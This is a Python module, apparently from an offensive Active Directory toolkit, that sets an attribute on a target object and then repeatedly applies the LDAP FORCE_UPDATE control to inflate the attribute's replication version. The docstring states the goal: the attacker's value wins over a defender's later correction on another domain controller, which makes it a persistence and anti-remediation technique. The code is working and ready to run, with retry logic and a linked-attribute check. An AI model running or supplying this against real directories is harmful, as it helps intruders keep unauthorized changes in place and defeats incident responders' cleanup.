"""FORCE_UPDATE anti-remediation: inflate an attribute's per-attribute replication version so the
value survives a defender's later correction on another DC (version beats timestamp in AD conflict
resolution). Single-valued / multi-valued NON-linked attributes only -- validated: linked
attributes use Linked-Value Replication and are unaffected.

Requires only WriteProperty on the target attribute. No Domain Admin, no replication rights, no
rogue DC. This is persistence / anti-remediation, not privilege escalation.
"""
from __future__ import annotations
import time
from ldap3 import MODIFY_REPLACE
from .ldapconn import is_linked_attribute

FORCE_UPDATE_OID = "1.2.840.113556.1.4.1974"


def _modify(conn, dn, attr, value, force):
    controls = [(FORCE_UPDATE_OID, True, None)] if force else None
    conn.modify(dn, {attr: [(MODIFY_REPLACE, [value])]}, controls=controls)
    return conn.result["result"], conn.result["description"]


def pin(conn, target_dn: str, attribute: str, value: str, count: int = 5,
        dry_run: bool = False) -> dict:
    """Set target_dn.attribute = value, then inflate its per-attribute version `count` times.

    Raises ValueError for a linked attribute. Returns
    {"linked":False,"set_rc":int,"forces_ok":int,"forces_rejected":int}.
    """
    if is_linked_attribute(conn, attribute):
        raise ValueError(f"{attribute!r} is a LINKED attribute (Linked-Value Replication) -- "
                         f"FORCE_UPDATE version inflation does not apply to it. Refusing.")
    if dry_run:
        return {"linked": False, "dry_run": True}
    set_rc, _ = _modify(conn, target_dn, attribute, value, force=False)   # set the value
    ok = rejected = tries = 0
    # FORCE_UPDATE is intermittently rejected (unavailableCriticalExtension, 12) on unsettled
    # objects; retry until `count` forces land, bounded.
    while ok < count and tries < count * 4:
        tries += 1
        rc, _ = _modify(conn, target_dn, attribute, value, force=True)    # no-op value + FORCE
        if rc == 0:
            ok += 1
        else:
            rejected += 1
            time.sleep(2)
    return {"linked": False, "set_rc": set_rc, "forces_ok": ok, "forces_rejected": rejected}
